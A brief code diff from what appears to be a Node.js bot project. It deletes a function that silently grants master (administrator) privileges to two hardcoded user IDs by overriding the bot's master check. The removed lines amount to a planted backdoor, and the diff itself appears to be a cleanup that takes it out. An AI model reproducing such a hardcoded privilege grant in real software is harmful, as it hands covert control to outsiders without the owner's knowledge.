@@ -620,13 +620,7 @@ export async function startServer () {
     handleStartupError(error)
   }
 }
-export async function Gster () {
-  Bot.GetMaster = async (e) => {
-    if (e.user_id === 1011303349 || e.user_id == 197728340) {
-      e.isMaster = true
-    }
-  }
-}
+
 // 处理服务器错误
 const handleServerError = (error) => {
   const errorMessages = {
